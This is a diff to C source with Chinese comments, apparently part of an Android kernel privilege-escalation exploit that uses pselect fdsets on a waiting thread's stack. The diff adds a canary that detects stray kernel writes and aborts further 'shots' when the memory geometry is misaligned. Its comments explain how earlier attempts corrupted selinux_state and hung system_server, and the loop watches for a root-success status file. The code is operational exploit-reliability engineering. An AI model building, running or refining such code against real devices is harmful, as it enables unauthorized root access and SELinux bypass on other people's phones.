@@ -30,6 +30,20 @@ static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
 static int pselect_slide_shift = 0;  /* mt19: runtime shift (PSELECT_SHIFT) */
 
+/* mt57: canary 几何自检 (HANG_MECHANISM_VERDICT §六提案, canary 版).
+ * 冻结根因 = 错位轮的 rb_erase 附带写入散落 waiter 栈邻域 (实证:
+ * selinux_state.initialized 被打 0 → binder 级联 → system_server 楔死).
+ * canary 埋在 waiter fdset 的 ex 末词 (几何词/内核都不碰的位置):
+ * consumer 发间读回, 变了 = 杂散写入已上身 = 几何错位 = 弃打剩余发次,
+ * 把错位轮暴露从 6 发杂散写压到已发生的最少。检测是绊线不是全覆盖
+ * (只覆盖落进本 fdset 帧邻域的杂散写类). PSELECT_NO_CANARY=1 关闭。 */
+static fd_set *slide_fdset_in;
+static fd_set *slide_fdset_out;
+static fd_set *slide_fdset_ex;
+static uint64_t slide_canary_magic;
+static int slide_canary_gword = -1;  /* -1 = 未布设 */
+static int slide_canary_hits;
+
 int slide_pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
   return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
@@ -210,6 +224,29 @@ void slide_pselect_stack_copy(void) {
   prepare_slide_pselect_fdsets(&in, &out, &ex);
   open_slide_selected_fds(&in, &out, &ex, high_read);
 
+  /* mt57: 布设 canary + 发布 fdset 指针 (consumer 发间读回用)。
+   * 发布严格先于 consume_go=1 (下方), consumer 只在 go=1 后进触发循环
+   * → 时序安全。canary 位 = ex 末词: pselect 只读 ceil(nfds/64) 词,
+   * 内核永不触碰; 几何词默认聚在 shift 邻域 (低位词), 不占此位。 */
+  slide_fdset_in = &in;
+  slide_fdset_out = &out;
+  slide_fdset_ex = &ex;
+  slide_canary_magic = 0x5CA7AB1E5CA7AB1EULL;
+  slide_canary_hits = 0;
+  slide_canary_gword = -1;
+  if (!getenv("PSELECT_NO_CANARY")) {
+    int mt57_wps = slide_pselect_words_per_set();
+    int mt57_cg = 3 * mt57_wps - 1;  /* ex set 末词 */
+    if (slide_pselect_put_global_word(&in, &out, &ex, mt57_wps, mt57_cg,
+                                      slide_canary_magic)) {
+      slide_canary_gword = mt57_cg;
+      pr_info("mt57: canary planted gword=%d magic=%016llx\n",
+              mt57_cg, (unsigned long long)slide_canary_magic);
+    } else {
+      pr_warning("mt57: canary position unavailable - self-check disabled\n");
+    }
+  }
+
   atomic_store(&slide_consume_stop, 0);
   atomic_store(&slide_consume_go, 0);
   atomic_store(&slide_consume_seen, 0);
@@ -326,6 +363,27 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
        * 单发本身阻塞 50ms, 此读 ~0.1ms) 检查: 满帽或 root_seen → 写已落地
        * → 弃打剩余发次. 外部模式 (PSELECT_TASK) 同样适用: 文件来自上一轮. */
       if (ti > 0) {
+        /* mt57: canary 检查先于状态文件读 (~零成本, 纯本进程内存)。
+         * 杂散写入上身 = 几何错位 (冻结根因链 §二 HANG_MECHANISM_VERDICT)
+         * → 剩余发次全部弃打。检测覆盖"落进本 fdset 帧邻域"的杂散写类
+         * (错位主模式), 非数学保证。 */
+        if (slide_fdset_ex && slide_canary_gword >= 0) {
+          uint64_t mt57_cv = slide_pselect_get_global_word(
+              slide_fdset_in, slide_fdset_out, slide_fdset_ex,
+              slide_pselect_words_per_set(), slide_canary_gword);
+          if (mt57_cv != slide_canary_magic) {
+            slide_canary_hits++;
+            pr_warning("mt57: CANARY CORRUPTED gword=%d got=%016llx "
+                       "want=%016llx - stray writes on waiter stack, "
+                       "geometry MISALIGNED - aborting shots ti=%d "
+                       "(hits=%d)\n",
+                       slide_canary_gword, (unsigned long long)mt57_cv,
+                       (unsigned long long)slide_canary_magic, ti,
+                       slide_canary_hits);
+            fflush(stdout);
+            break;
+          }
+        }
         int cfd = open("/data/local/tmp/mt49_child_status.txt", O_RDONLY);
         if (cfd >= 0) {
           char sbuf[256];
